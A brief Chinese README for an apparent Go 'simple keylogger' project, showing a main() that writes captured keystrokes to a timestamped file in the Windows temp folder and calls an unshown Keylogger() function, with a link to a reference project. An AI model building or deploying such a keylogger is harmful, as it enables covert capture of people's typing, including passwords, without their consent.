# 简易键盘记录器

## 文件记录在 c:\\Windows\\temp\\ 目录下，以时间戳命名。
```
func main() {
	timeUnix := time.Now().Unix()
	KeylogSavePath = fmt.Sprintf("c:\\Windows\\temp\\%d.txt", timeUnix)

	Keylogger()
}
```


参考项目
1. https://github.com/JayGitH/EyeWorm
